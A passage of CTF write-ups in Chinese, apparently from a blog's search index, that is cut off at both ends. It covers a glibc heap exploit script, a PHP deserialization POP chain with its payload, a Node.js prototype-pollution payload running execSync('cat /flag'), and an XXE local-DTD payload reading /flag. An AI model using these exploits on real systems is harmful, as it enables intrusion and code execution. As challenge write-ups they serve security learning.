1delete(2)create(0xc0, b&#x27;&#x27;)  # 2delete(1)delete(2)_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]info(hex(_IO_2_1_stdin_))fake_chunk = _IO_2_1_stdin_+160-3create(0xc0, b&#x27;a&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 2create(0xa8, p64(0)*2+p64(one_gadget)*19)  # 1create(0x60, b&#x27;&#x27;)fake_vtable = heap_addr+0xf0payload = b&#x27;\\x00&#x27;*3 + p64(0)*2+p64(0x00000000ffffffff)+p64(0) * \\    2+p64(fake_vtable)+p64(0)*6create(0x63, payload)r.interactive()\n\n以上解法为nocbtm师傅的思路。下面为出题人的思路。\n其实出题人的思路在前半部分部分和上面是一样的，同样需要leak libc addr，leak heap addr，fastbin attack这三步攻击。\nenviron在libc中的environ里存放的是stack的地址。\n\n下面就是通过_IO_2_1_stdout_泄漏出environ当中的栈地址\n_IO_2_1_stdout_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]fake_chunk = _IO_2_1_stdout_ - 0x43create(0xc0, b&#x27;&#x27;) create(0x60, b&#x27;&#x27;)delete(3)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))payload = b&#x27;\\x00&#x27;*3+p64(0)*5+p64(libc_base+libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0xfbad1800)+p64(_IO_2_1_stdout_+131) * \\    3+p64(libc_base+libc.symbols[&#x27;environ&#x27;]) + \\    p64(libc_base+libc.symbols[&#x27;environ&#x27;]+8)create(0x60, b&#x27;&#x27;)create(0x63, payload)r.recvline()stack_addr = u64(r.recvuntil(b&#x27;1: Add a user&#x27;, drop=True))ret_addr = stack_addr-0xf0info(&#x27;stack_addr=&gt;&#x27;+hex(ret_addr))\n\n\n然后经过偏移计算获得main函数的返回地址。\n修改返回地址这里需要使用_IO_2_1_stdin_(不清楚的可以看看这篇文章echo back)来修改返回地址的内容\n_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]fake_chunk = _IO_2_1_stdin_-0x28create(0x60, b&#x27;&#x27;) delete(4)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk)) create(0x40, b&#x27;flag\\x00&#x27;)flag_addr = heap_addr+0x210create(0x60, b&#x27;&#x27;)edit(fake_chunk+0x8, p8(0x71))\n\n\n一样的操作，找到一个假的chunk然后修改_IO_buf_base和_IO_buf_end\npayload = p64(0)+p64(libc_base +                     libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(ret_addr-2)+p64(ret_addr+0x118)create(0x60, payload)  info(&#x27;fake_chunk=&gt;&#x27;+hex(fake_chunk))\n\n\n紧接着直接申请chunk过去然后修改掉上面两个指针的值，效果如上图。\n\n解释一下为什么要在_IO_buf_base处写上ret_addr-2   =&gt;   因为在最后输入的时候我们是在这个scanf当中输入的，所以我们需要预留两个位置输入b’5\\n’\norw最后因为题目在最后开启了沙盒所以我们只能用orw的方式来读flag。\npop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]write_addr = libc_base+libc.symbols[&#x27;write&#x27;]payload = b&#x27;5\\n&#x27;+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(72)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(flag_addr+8)+p64(pop_rdx)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + p64(flag_addr+8) + \\    p64(pop_rdx)+p64(0x100)+p64(write_addr)gdb.attach(r)r.recvuntil(b&#x27;&gt;&#x27;)r.sendline(payload)\n\n最后的栈内情况\n\n综上expfrom pwn import *r = process(&#x27;./domo&#x27;)# r = remote(&#x27;1.14.71.254&#x27;, 28041)elf = ELF(&#x27;./domo&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;def create(size, content):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.sendline(content)def delete(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def show(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def edit(address, num):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;addr:&#x27;)    r.sendline(bytes(str(address), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;num:&#x27;)    r.sendline(num)create(0x40, b&#x27;&#x27;)  # 0create(0x68, b&#x27;&#x27;)  # 1create(0xf0, b&#x27;&#x27;)  # 2create(0x10, b&#x27;&#x27;)  # 3delete(2)create(0xf0, b&#x27;a&#x27;*7)  # 2show(2)print(r.recvuntil(b&#x27;\\n&#x27;))print(r.recvuntil(b&#x27;a\\n&#x27;))main_arena_88 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf02a4+libc_baseprint(hex(one_gadget))create(0x10, b&#x27;&#x27;)  # 4delete(3)delete(4)create(0x10, b&#x27;&#x27;)  # 3show(3)print(r.recvuntil(b&#x27;\\n&#x27;))heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10a+0x10info(hex(heap_addr))delete(3)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))  # 0delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))  # 1delete(2)_IO_2_1_stdout_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]fake_chunk = _IO_2_1_stdout_ - 0x43create(0xc0, b&#x27;&#x27;)  # 2create(0x60, b&#x27;&#x27;)  # 3delete(3)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 1payload = b&#x27;\\x00&#x27;*3+p64(0)*5+p64(libc_base+libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0xfbad1800)+p64(_IO_2_1_stdout_+131) * \\    3+p64(libc_base+libc.symbols[&#x27;environ&#x27;]) + \\    p64(libc_base+libc.symbols[&#x27;environ&#x27;]+8)create(0x60, b&#x27;&#x27;)  # 2create(0x63, payload)  # 3r.recvline()stack_addr = u64(r.recvuntil(b&#x27;1: Add a user&#x27;, drop=True))ret_addr = stack_addr-0xf0info(&#x27;ret_addr=&gt;&#x27;+hex(ret_addr))_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]fake_chunk = _IO_2_1_stdin_-0x28create(0x60, b&#x27;&#x27;)  # 4delete(4)delete(1)delete(2)create(0xc0, b&#x27;\\x00&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 1create(0x40, b&#x27;flag\\x00&#x27;)  # 2flag_addr = heap_addr+0x210create(0x60, b&#x27;&#x27;)  # 4edit(fake_chunk+0x8, p8(0x71))payload = p64(0)+p64(libc_base +                     libc.symbols[&#x27;_IO_file_jumps&#x27;])+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(ret_addr-2)+p64(ret_addr+0x118)create(0x60, payload)  # 5info(&#x27;fake_chunk=&gt;&#x27;+hex(fake_chunk))pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]write_addr = libc_base+libc.symbols[&#x27;write&#x27;]payload = b&#x27;5\\n&#x27;+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(72)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(flag_addr+8)+p64(pop_rdx)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + p64(flag_addr+8) + \\    p64(pop_rdx)+p64(0x100)+p64(write_addr)r.recvuntil(b&#x27;&gt;&#x27;)r.sendline(payload)r.interactive()\n\n参考https://blog.play2win.top/2020/05/27/GKCTF%202020%20Domo%E5%88%86%E6%9E%90/#0x0-leak-libc-address%E5%92%8Cheap-address\n","categories":["比赛复现"],"tags":["_IO_FILE","fastbin attack","vtable","off by null"]},{"title":"GYCTF2020_Easyphp","url":"/2021/09/25/GYCTF2020-Easyphp/","content":"获取信息扫目录我的dirsearch不出所料的没扫到www.zip看了wp才知道是有源文件泄漏\n代码审计index.php\n&lt;?phprequire_once &quot;lib.php&quot;;if(isset($_GET[&#x27;action&#x27;]))&#123;\trequire_once(__DIR__.&quot;/&quot;.$_GET[&#x27;action&#x27;].&quot;.php&quot;);&#125;else&#123;\tif($_SESSION[&#x27;login&#x27;]==1)&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;;\t&#125;\telse&#123;\t\techo &quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;;\t&#125;&#125;?&gt;\n\nlogin.php\n&lt;?phprequire_once(&#x27;lib.php&#x27;);?&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;login&lt;/title&gt;&lt;center&gt;\t&lt;form action=&quot;login.php&quot; method=&quot;post&quot; style=&quot;margin-top: 300&quot;&gt;\t\t&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;\t\t&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;        \t\t&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;UserName&quot; required&gt;\t\t&lt;br&gt;\t\t&lt;input type=&quot;password&quot; style=&quot;margin-top: 20&quot; name=&quot;password&quot; placeholder=&quot;password&quot; required&gt;\t\t&lt;br&gt;\t\t&lt;button style=&quot;margin-top:20;&quot; type=&quot;submit&quot;&gt;登录&lt;/button&gt;\t\t&lt;br&gt;\t\t&lt;img src=&#x27;img/1.jpg&#x27;&gt;大家记得做好防护&lt;/img&gt;\t\t&lt;br&gt;\t\t&lt;br&gt;&lt;?php $user=new user();if(isset($_POST[&#x27;username&#x27;]))&#123;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123;\t\tdie(&quot;&lt;br&gt;Damn you, hacker!&quot;);\t&#125;\tif(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123;\t\tdie(&quot;Damn you, hacker!&quot;);\t&#125;\t$user-&gt;login();&#125;?&gt;\t&lt;/form&gt;&lt;/center&gt;\n\nlib.php\n&lt;?phperror_reporting(0);session_start();function safe($parm)&#123;    $array = array(&#x27;union&#x27;, &#x27;regexp&#x27;, &#x27;load&#x27;, &#x27;into&#x27;, &#x27;flag&#x27;, &#x27;file&#x27;, &#x27;insert&#x27;, &quot;&#x27;&quot;, &#x27;\\\\&#x27;, &quot;*&quot;, &quot;alter&quot;);    return str_replace($array, &#x27;hacker&#x27;, $parm);&#125;class User&#123;    public $id;    public $age = null;    public $nickname = null;    public function login()    &#123;        if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;])) &#123;            $mysqli = new dbCtrl();            $this-&gt;id = $mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);            if ($this-&gt;id) &#123;                $_SESSION[&#x27;id&#x27;] = $this-&gt;id;                $_SESSION[&#x27;login&#x27;] = 1;           // target                echo &quot;你的ID是&quot; . $_SESSION[&#x27;id&#x27;];                echo &quot;你好！&quot; . $_SESSION[&#x27;token&#x27;];                echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;                return $this-&gt;id;            &#125;        &#125;    &#125;    public function update()    &#123;        $Info = unserialize($this-&gt;getNewinfo());        $age = $Info-&gt;age;        $nickname = $Info-&gt;nickname;        $updateAction = new UpdateHelper($_SESSION[&#x27;id&#x27;], $Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#x27;id&#x27;]);        //这个功能还没有写完 先占坑    &#125;    public function getNewInfo()    &#123;        $age = $_POST[&#x27;age&#x27;];        $nickname = $_POST[&#x27;nickname&#x27;];        return safe(serialize(new Info($age, $nickname)));    &#125;    public function __destruct()    &#123;        return file_get_contents($this-&gt;nickname); //危    &#125;    public function __toString()    &#123;        // nickname = new Info();        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age, $nickname)    &#123;        $this-&gt;age = $age;        $this-&gt;nickname = $nickname;    &#125;    public function __call($name, $argument)    &#123;        // CtrlCase = new dbCtrl();        echo $this-&gt;CtrlCase-&gt;login($argument[0]);        // argument[0] = &#x27;select id,md5(1) from user where username=?&#x27;    &#125;&#125;class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo, $sql)    &#123;        $newInfo = unserialize($newInfo);        $upDate = new dbCtrl();    &#125;    public function __destruct()    &#123;        // sql = new User();        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public $hostname = &quot;127.0.0.1&quot;;    public $dbuser = &quot;root&quot;;    public $dbpass = &quot;root&quot;;    public $database = &quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name = $_POST[&#x27;username&#x27;];        $this-&gt;password = $_POST[&#x27;password&#x27;];        $this-&gt;token = $_SESSION[&#x27;token&#x27;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli = new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result = $this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token == &#x27;admin&#x27;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo (&#x27;用户不存在!&#x27;);            return false;        &#125;        if (md5($this-&gt;password) !== $passwordResult) &#123;            echo (&#x27;密码错误！&#x27;);            return false;        &#125;        $_SESSION[&#x27;token&#x27;] = $this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        //还没来得及写    &#125;&#125;\n\nupdate.php\n&lt;?phprequire_once(&#x27;lib.php&#x27;);echo &#x27;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;&lt;/html&gt;&#x27;;if ($_SESSION[&#x27;login&#x27;]!=1)&#123;\techo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123;\trequire_once(&quot;flag.php&quot;);\techo $flag;&#125;?&gt;\n\n经过审计可以很轻易的发现漏洞点在update.php\n\n即便是上面if语句成立也会执行下面的内容\n\n然后存在反序列化漏洞，开始看见下面存在file_get_contents觉得可以直接获取flag但是是我想多了，上面有个safe函数过滤了flag关键字。\n\n只要我的session文件login为1就可以拿到flag，再看lib.php那里修改了session\n\nUser的login函数会修改$_SESSION[‘login’]=1,但是一定要this-&gt;id存在，所以必定要执行这个sql语句\n\n里面只需要this-&gt;token为admin就可以返回id所以只需要最下面的$_SESSION[‘token’]=$this-&gt;name执行了，后续直接随便登录就行。\n构造pop链由上面可知我们最后需要执行的是dbCtrl-&gt;login()\n往上看有一个很显眼的\n\n看得到这里有一个很刺眼的login，所以在倒数第二步应该是他了(这些赋值的注释是我在做题过程中自己写的一些笔记)\n然后就是找到调用__call的地方\n在User类里面的__toString函数里面存在可以达到目的的调用方式\n\n最后在哪调用__toString也很简单了\n\n这里有一个很明显的echo，所以整条链子都清楚了。\nUpdateHelper-&gt;__destruct==&gt;User-&gt;__toString==&gt;Info-&gt;__call==&gt;dbCtrl-&gt;login\n解题给出exp\n&lt;?phpclass User&#123;    public $age;    public $nickname;    public function __construct()    &#123;        $this-&gt;nickname = new Info();        $this-&gt;age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;    &#125;&#125;class Info&#123;    public $CtrlCase;    public function __construct()    &#123;        $this-&gt;CtrlCase = new dbCtrl();    &#125;&#125;class UpdateHelper&#123;    public $sql;    public function __construct()    &#123;        $this-&gt;sql = new User();    &#125;&#125;class dbCtrl&#123;    public $name;    public $password;    public function __construct()    &#123;        $this-&gt;name = &#x27;admin&#x27;;        $this-&gt;password = &#x27;1&#x27;;    &#125;&#125;echo serialize(new UpdateHelper());// 这里还需要通过上面的replace来进行字符串逃逸。\n\n最终的payload:\nage=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;\n\n","categories":["web-buuctf"],"tags":["pop链"]},{"title":"GYCTF2020_Ez_Express","url":"/2021/10/04/GYCTF2020-Ez-Express/","content":"信息收集打开题目就一个登录注册页面，并没有找到什么。直接扫目录\n扫出info。访问里面显示有一个/www.zip源码泄漏\nindex.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123;  for (var attr in b) &#123;    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;      merge(a[attr], b[attr]);    &#125; else &#123;      a[attr] = b[attr];    &#125;  &#125;  return a&#125;const clone = (a) =&gt; &#123;  return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123;  if (keyword.match(/(admin)/is)) &#123;    return keyword  &#125;  return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123;  if (!req.session.user) &#123;    res.redirect(&#x27;/login&#x27;);  &#125;  res.outputFunctionName = undefined;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: req.session.user.user &#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123;  res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123;  if (req.body.Submit == &quot;register&quot;) &#123;    if (safeKeyword(req.body.userid)) &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    req.session.user = &#123;      &#x27;user&#x27;: req.body.userid.toUpperCase(),      &#x27;passwd&#x27;: req.body.pwd,      &#x27;isLogin&#x27;: false    &#125;    res.redirect(&#x27;/&#x27;);  &#125;  else if (req.body.Submit == &quot;login&quot;) &#123;    if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;    if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;      req.session.user.isLogin = true;    &#125;    else &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;  &#125;  res.redirect(&#x27;/&#x27;);;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: res.outputFunctionName &#125;);&#125;)module.exports = router;\n\n知识点原型链污染js的考点主要还是原型链污染，这里的merge函数也就是危险函数。\nconst isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;// 上面就是检验参数obj是否是个对象const merge = (a, b) =&gt; &#123;  for (var attr in b) &#123;    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;      merge(a[attr], b[attr]);// 要是b和a的attr属性是一个对象的话就会进行递归    &#125; else &#123;      a[attr] = b[attr];// 将对象b的属性赋值给a    &#125;  &#125;  return a&#125;// 所以根据上面，可以看出来原型对象__proto__会进入递归赋值，然而js的对象寻找属性的规则就是，要是对象本身找不到这个属性就会跟着__proto__链找，直到__proto__为NULL，所以当我们有可控参数的时候就可以让，Object()的__proto__赋上我们想要的键值。const clone = (a) =&gt; &#123;  return merge(&#123;&#125;, a);&#125;// 这就是一个闭包\n\n编码绕过\n可以看到提示有admin用户\nrouter.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);\n\n也许要admin用户才能提交action\nfunction safeKeyword(keyword) &#123;  if (keyword.match(/(admin)/is)) &#123;    return keyword  &#125;  return undefined&#125;router.post(&#x27;/login&#x27;, function (req, res) &#123;  if (req.body.Submit == &quot;register&quot;) &#123;    if (safeKeyword(req.body.userid)) &#123;// 但是这里可以看到要是直接提交admin会被过滤这里用特殊字符绕过      res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    req.session.user = &#123;      &#x27;user&#x27;: req.body.userid.toUpperCase(),      &#x27;passwd&#x27;: req.body.pwd,      &#x27;isLogin&#x27;: false    &#125;    res.redirect(&#x27;/&#x27;);  &#125;  else if (req.body.Submit == &quot;login&quot;) &#123;    if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;    if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;      req.session.user.isLogin = true;    &#125;    else &#123;      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;  &#125;  res.redirect(&#x27;/&#x27;);;&#125;);\n\n\n特殊字符绕过\ntoUpperCase()\n这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。\ntoLowerCase()\n这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.\n\n解题首先使用admın,绕过注册绕过safeKeyword\nrouter.get(&#x27;/&#x27;, function (req, res) &#123;  if (!req.session.user) &#123;    res.redirect(&#x27;/login&#x27;);  &#125;  res.outputFunctionName = undefined;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: req.session.user.user &#125;);&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123;  if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125;  req.session.user.data = clone(req.body);// 这里存在原型链污染  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;, data = &#123; &#x27;user&#x27;: res.outputFunctionName &#125;);// 这里调用了outputFunctionName属性，但是在&quot;/&quot;路由里面让这个属性等于了undefined所以只需要污染这个属性就可以实现SSTI&#125;)\n\npayload:&#123;&quot;lua&quot;:&quot;python&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;// 注意要将POST的enctype换成application/json才能当作对象解析\n","categories":["web-buuctf"],"tags":["原型链污染"]},{"title":"GoogleCTF2019_Quals_Bnv","url":"/2021/10/18/GoogleCTF2019-Quals-Bnv/","content":"拿到题目束手无策，扫描后无果直接看了wp，知道这是xxe\n\n江湖流传，有json的地方就有可能有xxe\n\n显示没有DTD，那就加一个\n\n没有声明这个element\n\n发现正常了,习惯性file协议看一下发现无果，看看可不可以引用内部文件\n\n\n不是标记语法，说被加载但是被断了，试试外部加载\n\n同样不行。但是根据这里会显示完整的实体名字，在加上上面已经加载了内容那就可以综合利用起来\n引用本地DTD文件\n这是ubuntu 系统自带的/usr/share/yelp/dtd/docbookx.dtd的部分内容，内部定义了一些实体，我们只需要覆盖之后就行了。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#x27;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;                    \t&lt;!-- 这里呢，就是通过file协议读取flag --&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        \t&lt;!-- 这里很好看出来，就是直接利用报错会显示完整的实体名字，把在上面读取的flag加载进去就行了 --&gt;        &amp;#x25;eval;        &amp;#x25;error;&#x27;&gt;%local_dtd;]&gt;\n\n引用文章https://www.freebuf.com/vuls/207639.html\n","categories":["web-buuctf"],"tags":["xxe"]},{"title":"HarekazeCTF2019_Easy_Notes","url":"/2021/11/02/HarekazeCTF2019-Easy-Notes/","content":"题目给了源码，emmm只不过感觉很多题都有github链接，但是题目并没说什么题目有源码，害我每次都在那儿像个啥子一样找半天。\n代码审计flag.php&lt;section&gt;  &lt;h2&gt;Get flag&lt;/h2&gt;  &lt;p&gt;    &lt;?php    if (is_admin()) &#123;      echo &quot;Congratulations! The flag is: &lt;code&gt;&quot; . getenv(&#x27;FLAG&#x27;) . &quot;&lt;/code&gt;&quot;;    &#125; else &#123;      echo &quot;You are not an admin :(&quot;;    &#125;    ?&gt;  &lt;/p&gt;&lt;/section&gt;lib.phpfunction is_admin() &#123;  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;    return false;  &#125;  return $_SESSION[&#x27;admin&#x27;] === 